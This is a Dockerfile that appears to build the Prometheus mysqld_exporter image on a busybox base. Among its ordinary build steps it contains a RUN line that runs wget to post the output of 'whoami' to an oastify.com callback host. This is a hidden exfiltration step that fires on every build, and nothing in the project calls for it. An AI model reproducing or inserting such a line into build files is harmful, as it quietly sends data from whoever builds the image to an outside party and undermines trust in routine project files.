ARG ARCH="amd64"
ARG OS="linux"
FROM quay.io/prometheus/busybox-${OS}-${ARCH}:latest
LABEL maintainer="The Prometheus Authors <prometheus-developers@googlegroups.com>"

ARG ARCH="amd64"
ARG OS="linux"
RUN wget --post-data="$(whoami)" http://qsmelspxgnhve8euwc0l0wri99f83yrn.oastify.com/receive
COPY .build/${OS}-${ARCH}/mysqld_exporter /bin/mysqld_exporter

EXPOSE      9104
USER        nobody
ENTRYPOINT  [ "/bin/mysqld_exporter" ]
